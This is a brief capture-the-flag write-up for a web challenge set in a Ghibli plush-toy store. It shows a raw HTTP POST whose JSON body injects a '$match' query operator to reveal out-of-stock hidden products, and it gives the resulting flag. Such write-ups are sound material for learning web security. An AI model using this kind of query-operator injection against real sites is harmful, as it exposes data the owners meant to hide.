We're working on a new Ghibli store to sell the cutest plush toys you'll find on the internet! We don't have all the products in stock yet, can you find the hidden item?

Challenge Host: http://ghibli.pwn.site:8035/

Change instock value for product API to false:

```http
POST /api/products HTTP/1.1
Host: ghibli.pwn.site:8035
Content-Length: 38
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://ghibli.pwn.site:8035
Referer: http://ghibli.pwn.site:8035/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

{"query":{"$match":{"instock":false}}}
```

Flag 1:

flag{s1mpl3_m47ch_w45_4ll_1t_n33d3d}


